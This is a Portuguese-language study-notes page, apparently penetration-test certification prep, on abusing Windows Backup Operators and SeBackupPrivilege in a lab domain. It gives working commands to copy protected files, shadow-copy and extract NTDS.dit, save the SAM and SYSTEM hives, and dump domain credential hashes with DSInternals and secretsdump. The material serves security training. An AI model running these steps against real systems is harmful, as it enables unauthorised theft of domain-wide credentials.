> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/windows-built-in-groups.md).

# Windows Built-in Groups

**Backup Operators**

* Após o pouso em uma máquina, podemos usar o comando `whoami /groups`para exibir nossas associações de grupo atuais.
* Podemos usar esta [prova de conceito](https://github.com/giuliano108/SeBackupPrivilege) para explorar a vulnerabilidade `SeBackupPrivilege`e copiar este arquivo. Primeiro, vamos importar as bibliotecas em uma sessão do PowerShell.
* No Windows, se um usuário tiver a permissão "[Fazer backup de arquivos e diretórios](http://technet.microsoft.com/en-us/library/cc787956.aspx)", ele receberá o [privilégio](http://msdn.microsoft.com/en-us/library/windows/desktop/bb530716.aspx)`SE_BACKUP_NAME`. Esse privilégio está desativado por padrão, mas, quando ativado, permite que o usuário acesse diretórios/arquivos *que não lhe pertencem* ou *para os quais não tem permissão* .

{% code lineNumbers="true" %}

```ps
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

{% endcode %}

* **Verificando se o privilégio SeBackupPrivilege está ativado**

{% code lineNumbers="true" %}

```ps
whoami /priv #or 
Get-SeBackupPrivilege
```

{% endcode %}

**Habilitando o privilégio SeBackup**

* Se o privilégio estiver desativado, podemos ativá-lo com `Set-SeBackupPrivilege`&#x20;

{% code lineNumbers="true" %}

```ps
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

{% endcode %}

* Se o privilégio for ativado com sucesso, esse privilégio pode ser usado para copiar qualquer arquivo protegido

```ps
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

**Atacando um Controlador de Domínio - Copiando o NTDS.dit**

* Este grupo também permite o login local em um controlador de domínio. O banco de dados do Active Directory `NTDS.dit`é um alvo muito atraente, pois contém os hashes NTLM de todos os objetos de usuário e computador no domínio.
* Como o `NTDS.dit`arquivo está bloqueado por padrão, podemos usar o utilitário [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) do Windows para criar uma cópia de sombra da `C`unidade e expô-la como `E`uma unidade.&#x20;

```ps
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:
```

**Copiando NTDS.dit localmente**

* Em seguida, podemos usar o `Copy-FileSeBackupPrivilege`cmdlet para ignorar a ACL e copiar o NTDS.dit localmente.

```ps
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

**Fazendo backup dos hives de registro SAM e SYSTEM**

* Esse privilégio também nos permite fazer backup dos hives de registro SAM e SYSTEM, dos quais podemos extrair credenciais de contas locais offline usando uma ferramenta como o Impacket.`secretsdump.py`&#x20;

{% code lineNumbers="true" %}

```ps
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

{% endcode %}

* **Extraindo credenciais do NTDS.dit**

```ps1
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

* **Extraindo hashes usando o SecretsDump**

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

* **Copiando arquivos com o Robocopy**

```ps
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
